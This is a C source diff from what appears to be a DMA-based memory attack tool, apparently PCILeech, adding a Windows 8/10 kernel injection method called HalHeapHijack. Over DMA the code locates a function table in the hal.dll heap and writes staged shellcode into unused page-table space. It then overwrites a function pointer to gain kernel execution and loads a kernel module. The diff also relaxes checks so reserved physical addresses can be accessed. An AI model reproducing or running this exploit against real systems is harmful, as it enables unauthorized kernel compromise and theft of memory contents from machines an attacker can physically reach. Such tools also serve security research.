@@ -99,6 +99,8 @@ typedef struct tdKERNELSEEKER {
 #define STAGE2_OFFSET_FN_STAGE1_ORIG	8
 #define STAGE2_OFFSET_EXTRADATA1		16
 
+BOOL KMD_GetPhysicalMemoryMap(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Inout_ PKMDHANDLE phKMD);
+
 //-------------------------------------------------------------------------------
 // Signature mathing below.
 //-------------------------------------------------------------------------------
@@ -346,6 +348,139 @@ BOOL KMD_LinuxKernelSeekSignature(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceDa
 }
 
 //-------------------------------------------------------------------------------
+// Windows 8/10 generic kernel signature below.
+//-------------------------------------------------------------------------------
+
+BOOL KMD_Win_SearchTableHalpInterruptController(_In_ PBYTE pbPage, _In_ QWORD qwPageVA, _Out_ PDWORD dwHookFnPgOffset)
+{
+	DWORD i;
+	BOOL result;
+	for(i = 0; i < (0x1000 - 0x78); i += 8) {
+		result =
+			(*(PQWORD)(pbPage + i + 0x18) == 0x28) &&
+			((*(PQWORD)(pbPage + i + 0x00) & ~0xfff) == qwPageVA) &&
+			((*(PQWORD)(pbPage + i + 0x10) & ~0xfff) == qwPageVA) &&
+			((*(PQWORD)(pbPage + i + 0x78) & 0xffffff0000000000) == 0xfffff80000000000);
+		if(result) {
+			*dwHookFnPgOffset = i + 0x78;
+			return TRUE;
+		}
+	}
+	return FALSE;
+}
+
+// https://blog.coresecurity.com/2016/08/25/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-3-windows-hals-heap/
+BOOL KMDOpen_HalHeapHijack(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
+{
+	DWORD ADDR_HAL_HEAP_PA = 0x00001000;
+	QWORD ADDR_SHELLCODE_VA = 0xffffffffffc00100;
+	BOOL result;
+	SIGNATURE oSignature;
+	PKMDHANDLE pKMD = NULL;
+	PDWORD pdwPhysicalAddress;
+	BYTE pbHal[0x1000] = { 0 }, pbPT[0x1000] = { 0 }, pbNULL[0x300] = { 0 };
+	DWORD dwHookFnPgOffset;
+	QWORD qwPML4, qwAddrHalHeapVA, qwPTEOrig, qwPTEPA, qwPTPA;
+	//------------------------------------------------
+	// 1: Fetch hal.dll heap and perform sanity checks.
+	//------------------------------------------------
+	Util_CreateSignatureWindowsHalGeneric(&oSignature);
+	result = DeviceReadDMARetryOnFail(pDeviceData, ADDR_HAL_HEAP_PA, pbHal, 0x1000);
+	qwPML4 = *(PQWORD)(pbHal + 0xa0);
+	qwAddrHalHeapVA = *(PQWORD)(pbHal + 0x78);
+	if(!result || (qwPML4 & 0xffffffff00000fff) || ((qwAddrHalHeapVA & 0xfffffffffff00fff) != 0xffffffffffd00000)) {
+		printf("KMD: Failed. Error reading or interpreting hal heap #1.\n");
+		goto fail;
+	}
+	result = Util_PageTable_ReadPTE(pCfg, pDeviceData, qwPML4, qwAddrHalHeapVA, &qwPTEOrig, &qwPTEPA);
+	if(!result || ((qwPTEOrig & 0x00007ffffffff003) != 0x1003)) {
+		printf("KMD: Failed. Error reading or interpreting hal PTE.\n");
+		goto fail;
+	}
+	//------------------------------------------------
+	// 2: Search for function table in hal.dll heap.
+	//------------------------------------------------
+	for(qwAddrHalHeapVA = 0xffffffffffd00000; qwAddrHalHeapVA < 0xffffffffffe00000; qwAddrHalHeapVA += 0x1000) {
+		result =
+			Util_PageTable_ReadPTE(pCfg, pDeviceData, qwPML4, qwAddrHalHeapVA, &qwPTEOrig, &qwPTEPA) &&
+			((qwPTEOrig & 0x00007fff00000003) == 0x00000003) &&
+			DeviceReadDMARetryOnFail(pDeviceData, (qwPTEOrig & 0xfffff000), pbHal, 0x1000) &&
+			KMD_Win_SearchTableHalpInterruptController(pbHal, qwAddrHalHeapVA, &dwHookFnPgOffset);
+		if(result) {
+			break;
+		}
+	}
+	if(!result) {
+		printf("KMD: Failed. Failed finding entry point.\n");
+		goto fail;
+	}
+	qwPTPA = qwPTEPA & ~0xfff;
+	result = DeviceReadDMARetryOnFail(pDeviceData, (DWORD)qwPTPA, pbPT, 0x1000);
+	if(!result || memcmp(pbPT, pbNULL, 0x300)) { // first 0x300 bytes in Hal PT must be zero
+		printf("KMD: Failed. Error reading or interpreting PT.\n");
+		goto fail;
+	}
+	//------------------------------------------------
+	// 3: Write shellcode into page table empty space.
+	//------------------------------------------------
+	*(PQWORD)pbPT = qwPTPA | 0x63; // PTE for addr: 0xffffffffffc00000
+	memcpy(pbPT + 0x100, oSignature.chunk[3].pb, oSignature.chunk[3].cb);
+	*(PQWORD)(pbPT + 0x100 + STAGE2_OFFSET_FN_STAGE1_ORIG) = *(PQWORD)(pbHal + dwHookFnPgOffset);
+	*(PQWORD)(pbPT + 0x100 + STAGE2_OFFSET_EXTRADATA1) = qwAddrHalHeapVA + dwHookFnPgOffset;
+	printf("INFO: PA PT:     0x%08x\n", qwPTPA);
+	printf("INFO: PA FN:     0x%08x\n", (qwPTEOrig & 0xfffff000) + dwHookFnPgOffset);
+	DeviceWriteDMA_Retry(pDeviceData, (DWORD)qwPTPA, pbPT, 0x300);
+	//------------------------------------------------
+	// 4: Place hook by overwriting function addr in hal.dll heap.
+	//------------------------------------------------
+	Sleep(250);
+	DeviceWriteDMA_Retry(pDeviceData, (qwPTEOrig & 0xfffff000) + dwHookFnPgOffset, (PBYTE)&ADDR_SHELLCODE_VA, sizeof(QWORD));
+	printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
+	//------------------------------------------------
+	// 5: wait for patch to reveive execution.
+	//------------------------------------------------
+	pdwPhysicalAddress = (PDWORD)(pbPT + 0x100 + STAGE2_OFFSET_STAGE3_PHYSADDR);
+	do {
+		Sleep(100);
+		if(!DeviceReadDMARetryOnFail(pDeviceData, (DWORD)qwPTPA, pbPT, 4096)) {
+			printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
+			goto fail;
+		}
+	} while(!*pdwPhysicalAddress);
+	printf("KMD: Execution received - continuing ...\n");
+	//------------------------------------------------
+	// 6: Restore hooks to original.
+	//------------------------------------------------
+	Sleep(250);
+	DeviceWriteDMA(pDeviceData, (DWORD)qwPTPA, pbNULL, 0x300);
+	//------------------------------------------------
+	// 7: Set up kernel module shellcode (stage3)
+	//------------------------------------------------
+	if(*pdwPhysicalAddress == 0xffffffff) {
+		printf("KMD: Failed. Stage2 shellcode error.\n");
+		goto fail;
+	}
+	DeviceWriteDMA(pDeviceData, *pdwPhysicalAddress + 0x1000, oSignature.chunk[4].pb, 4096);
+	if(!(pKMD = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE)))) { goto fail; }
+	pKMD->dwPageAddr32 = *pdwPhysicalAddress;
+	pKMD->status = (PKMDDATA)pKMD->pbPageData;
+	DeviceReadDMA(pDeviceData, pKMD->dwPageAddr32, pKMD->pbPageData, 4096);
+	//------------------------------------------------
+	// 8: Retrieve physical memory range map and complete open action.
+	//------------------------------------------------
+	if(!KMD_GetPhysicalMemoryMap(pCfg, pDeviceData, pKMD)) {
+		printf("KMD: Failed. Failed to retrieve physical memory map.\n");
+		goto fail;
+	}
+	pDeviceData->KMDHandle = (HANDLE)pKMD;
+	if(pCfg->tpAction == KMDLOAD) { pCfg->qwKMD = pKMD->dwPageAddr32; }
+	return TRUE;
+fail:
+	LocalFree(pKMD);
+	return FALSE;
+}
+
+//-------------------------------------------------------------------------------
 // KMD command function below.
 //-------------------------------------------------------------------------------
 
@@ -400,7 +535,7 @@ BOOL KMDReadMemory_DMABufferSized(_In_ PDEVICE_DATA pDeviceData, _In_ QWORD qwAd
 {
 	BOOL result;
 	PKMDHANDLE phKMD = (PKMDHANDLE)pDeviceData->KMDHandle;
-	if(!KMD_IsRangeInPhysicalMap(phKMD, qwAddress, cb)) {
+	if(!KMD_IsRangeInPhysicalMap(phKMD, qwAddress, cb) && !pDeviceData->IsAllowedAccessReservedAddress) {
 		if(cb <= 0x1000) { // Return blank memory and ok on 1 page read (smallest unit) if not in physical map.
 			memset(pb, 0, cb);
 			return TRUE;
@@ -420,7 +555,7 @@ BOOL KMDWriteMemory_DMABufferSized(_In_ PDEVICE_DATA pDeviceData, _In_ QWORD qwA
 {
 	BOOL result;
 	PKMDHANDLE phKMD = (PKMDHANDLE)pDeviceData->KMDHandle;
-	if(!KMD_IsRangeInPhysicalMap(phKMD, qwAddress, cb)) { return E_FAIL; }
+	if(!KMD_IsRangeInPhysicalMap(phKMD, qwAddress, cb) && !pDeviceData->IsAllowedAccessReservedAddress) { return E_FAIL; }
 	result = DeviceWriteDMA(pDeviceData, (DWORD)phKMD->status->DMAAddrPhysical, pb, cb);
 	if(!result) { return FALSE; }
 	phKMD->status->_size = cb;
@@ -774,9 +909,11 @@ BOOL KMDOpen(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 	if(pCfg->qwKMD) {
 		return KMDOpen_LoadExisting(pCfg, pDeviceData);
 	} else if(pCfg->qwCR3 || pCfg->fPageTableScan) {
-		return KMDOpen_PageTableHijack(pCfg, pDeviceData); // TODO: FIX HRESULT
+		return KMDOpen_PageTableHijack(pCfg, pDeviceData);
+	} else if(0 == _stricmp(pCfg->szKMDName, "WIN10_X64")) {
+		return KMDOpen_HalHeapHijack(pCfg, pDeviceData);
 	} else {
-		return KMDOpen_MemoryScan(pCfg, pDeviceData); // TODO: FIX HRESULT
+		return KMDOpen_MemoryScan(pCfg, pDeviceData);
 	}
 }
 
